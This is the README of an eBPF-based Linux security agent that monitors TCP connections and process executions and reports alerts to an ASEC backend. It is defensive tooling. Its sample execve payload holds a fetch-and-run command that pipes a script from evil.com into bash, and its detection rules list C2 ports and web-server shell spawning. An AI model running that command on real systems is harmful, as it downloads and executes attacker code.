# ebpf-probe

轻量级 eBPF 安全探针，部署在 Linux 服务器上，实时采集网络流量、进程执行事件及异常行为，并上报至 ASEC 资产安全管理平台。

## 功能

| 能力 | 实现方式 | 说明 |
|------|----------|------|
| **流量拓扑** | eBPF tracepoint `sock:inet_sock_set_state` | 监控每条 TCP 连接的建立，记录五元组 + 进程信息 |
| **进程执行审计** | eBPF tracepoint `syscalls:sys_enter_execve` | 捕获每次 execve 系统调用，记录文件名、完整命令行 |
| **异常行为检测** | 用户态规则引擎 | 实时产生告警，入库后在平台展示 |
| **心跳保活** | HTTP 定时上报 | 每 30 秒向后端发送一次心跳，同步在线状态 |

### 内置告警规则

| 告警类型 | 严重级别 | 触发条件 |
|----------|----------|----------|
| `suspicious_outbound_port` | high | 进程主动连接已知恶意/危险端口（4444、6666、1337 等 C2 常用端口） |
| `server_unexpected_outbound` | medium | nginx/apache/mysql 等服务进程向公网 IP 发起出站连接 |
| `shell_from_server` | critical | Web 服务进程（nginx、php-fpm 等）产生 bash/sh/zsh 子进程 |
| `exec_from_tmp` | high | 从 `/tmp`、`/dev/shm`、`/var/tmp` 等可写目录执行程序 |

---

## 架构

```
┌─────────────────────────────────────────────────────────┐
│                    Linux 服务器                          │
│                                                         │
│  ┌──────────┐    ringbuf    ┌───────────────────────┐   │
│  │ flow.c   │ ──────────▶  │  FlowProbe (Go)        │   │
│  │ (eBPF)   │              │  · 解析五元组           │   │
│  └──────────┘              │  · 告警检测             │   │
│                            └──────────┬────────────┘   │
│  ┌──────────┐    ringbuf              │  QueueFlow      │
│  │ exec.c   │ ──────────▶  ┌──────────▼────────────┐   │
│  │ (eBPF)   │              │  ExecProbe (Go)        │   │
│  └──────────┘              │  · 解析 execve          │   │
│                            │  · 读 /proc/pid/cmdline │   │
│                            │  · 告警检测             │   │
│                            └──────────┬────────────┘   │
│                                       │  QueueExec/Alert│
│                            ┌──────────▼────────────┐   │
│                            │  Reporter (Go)         │   │
│                            │  · 定时批量上报         │   │
│                            │  · X-Api-Key 鉴权      │   │
│                            └──────────┬────────────┘   │
└───────────────────────────────────────┼─────────────────┘
                                        │ HTTP POST
                              ┌─────────▼──────────┐
                              │   ASEC Backend      │
                              │  /v1/agent/flows    │
                              │  /v1/agent/execs    │
                              │  /v1/agent/alerts   │
                              │  /v1/agent/heartbeat│
                              └────────────────────┘
```

### 核心模块

```
asec-agent/
├── main.go              # 入口：加载配置、启动探针、信号处理
├── config/config.go     # YAML 配置加载
├── bpf/
│   ├── flow.c           # eBPF 程序：TCP 连接追踪
│   └── exec.c           # eBPF 程序：进程执行追踪
├── probe/
│   ├── gen.go           # bpf2go 代码生成指令
│   ├── flow.go          # FlowProbe：加载 flow.c，读 ringbuf，解析事件
│   ├── exec.go          # ExecProbe：加载 exec.c，读 ringbuf，解析事件
│   └── utils.go         # IP 工具、可疑端口/进程白名单
├── reporter/reporter.go # 事件队列 + 批量 HTTP 上报
├── systemd/             # systemd 服务单元文件
├── Makefile
└── agent.yaml.example   # 配置模板
```

### eBPF 实现细节

**flow.c** — 挂载 `sock:inet_sock_set_state` tracepoint

- 仅捕获 `newstate == TCP_ESTABLISHED` + `AF_INET` + `IPPROTO_TCP` 的事件
- 使用手动定义的 `sock_state_ctx` 结构体（稳定 ABI，无需 `vmlinux.h`），兼容内核 5.4–6.x
- 通过端口大小关系（`sport > dport`）启发式判断出站/入站方向
- 事件写入 `BPF_MAP_TYPE_RINGBUF`（16 MB），内核 ≥ 5.8 必须

**exec.c** — 挂载 `syscalls:sys_enter_execve` tracepoint

- 每次 execve 调用时捕获 PID、UID、进程名、可执行文件路径
- 用户态通过 `/proc/<pid>/cmdline` 补充完整命令行参数

---

## 环境要求

| 项目 | 要求 |
|------|------|
| 操作系统 | Linux，推荐 Ubuntu 20.04 / 22.04 / 24.04 |
| 内核版本 | ≥ 5.8（ringbuf 支持） |
| 架构 | x86_64 / arm64 |
| 权限 | root，或具有 `CAP_BPF CAP_NET_ADMIN CAP_PERFMON CAP_SYS_ADMIN` |
| 编译环境 | clang、libbpf-dev、linux-headers（仅编译时需要） |

---

## 快速上手

### 方式一：在 Linux 上直接编译

```bash
# 1. 安装编译依赖
sudo apt-get install clang libbpf-dev linux-headers-$(uname -r) make

# 2. 生成 eBPF 字节码（将 C 编译并嵌入 Go）
make generate

# 3. 编译 agent 二进制（静态，无 CGO 依赖）
make build

# 产物：./asec-agent（约 10 MB 单文件，无外部依赖）
```

### 方式二：通过 Docker 编译（适合 Windows/macOS 开发机）

```bash
make docker-build
# 产物同上
```

### 方式三：交叉编译 ARM64

```bash
make build-arm64
# 产物：./asec-agent-arm64
```

---

## 配置

复制配置模板并修改：

```bash
cp agent.yaml.example agent.yaml
```

```yaml
backend:
  # ASEC 平台后端地址（不带末尾斜杠）
  url: "http://your-backend:8000/api"
  # API 密钥，需与后台 sys_config 表中 agent_api_key 字段一致
  api_key: "change-me-secret-key"

agent:
  # 批量上报间隔（秒），默认 5
  flush_interval: 5
  # 主机 IP，留空则自动检测（通过 UDP dial 8.8.8.8 获取出站 IP）
  host_ip: ""
  # 主机名标签，留空则使用 os.Hostname()
  hostname: ""
```

**在 ASEC 后台设置 API Key**：进入「系统配置」，找到 `agent_api_key` 配置项，将值改为与 `agent.yaml` 中 `api_key` 一致的字符串。

---

## 运行

### 手动运行（测试用）

```bash
sudo ./asec-agent agent.yaml
```

### systemd 托管（生产部署）

```bash
make install
# 等价于：
#   cp asec-agent /usr/local/bin/
#   cp agent.yaml.example /etc/asec-agent.yaml   # 记得修改配置
#   cp systemd/asec-agent.service /etc/systemd/system/
#   systemctl daemon-reload && systemctl enable asec-agent

sudo nano /etc/asec-agent.yaml   # 填入正确的 backend.url 和 api_key

sudo systemctl start asec-agent
sudo systemctl status asec-agent

# 查看日志
sudo journalctl -u asec-agent -f
```

---

## 上报数据结构

所有请求均携带 `X-Api-Key` 请求头用于鉴权。

### 心跳 `POST /v1/agent/heartbeat`
```json
{ "ip": "10.0.0.1", "hostname": "web-01", "version": "1.0.0" }
```

### 流量 `POST /v1/agent/flows`
```json
{
  "ip": "10.0.0.1", "hostname": "web-01",
  "flows": [
    {
      "pid": 1234, "uid": 33, "comm": "nginx",
      "src_ip": "10.0.0.1", "dst_ip": "8.8.8.8",
      "src_port": 54321, "dst_port": 443,
      "direction": 0
    }
  ]
}
```
`direction`：`0` = 出站，`1` = 入站

### 进程执行 `POST /v1/agent/execs`
```json
{
  "ip": "10.0.0.1", "hostname": "web-01",
  "events": [
    {
      "pid": 5678, "uid": 0, "comm": "bash",
      "filename": "/bin/bash",
      "args": "bash -c 'curl http://evil.com/shell.sh | bash'"
    }
  ]
}
```

### 告警 `POST /v1/agent/alerts`
```json
{
  "ip": "10.0.0.1", "hostname": "web-01",
  "alerts": [
    {
      "alert_type": "shell_from_server",
      "severity": "critical",
      "pid": 5678, "comm": "php-fpm",
      "detail": "{\"parent_comm\":\"php-fpm\",\"shell\":\"/bin/bash\",\"cmdline\":\"bash -c whoami\"}"
    }
  ]
}
```

---

## 常见问题

**Q：启动报错 `failed to remove memlock rlimit`**
A：需要 root 权限或 `CAP_SYS_ADMIN`/`CAP_BPF` capability。

**Q：启动报错 `eBPF not compiled: run make generate`**
A：当前二进制是开发用 stub，需在 Linux 上执行 `make generate && make build`。

**Q：内核版本不满足怎么办**
A：最低需要 5.8（ringbuf 支持）。可通过 `uname -r` 查看当前内核版本。Ubuntu 20.04 默认内核是 5.4，可通过 `apt-get install linux-image-5.15.0-xx-generic` 升级 HWE 内核。

**Q：如何验证 agent 已成功连接后台**
A：查看后台「资产管理」→「Agent 监控」，或查看 agent 日志中是否出现 `POST /v1/agent/heartbeat` 成功的记录。
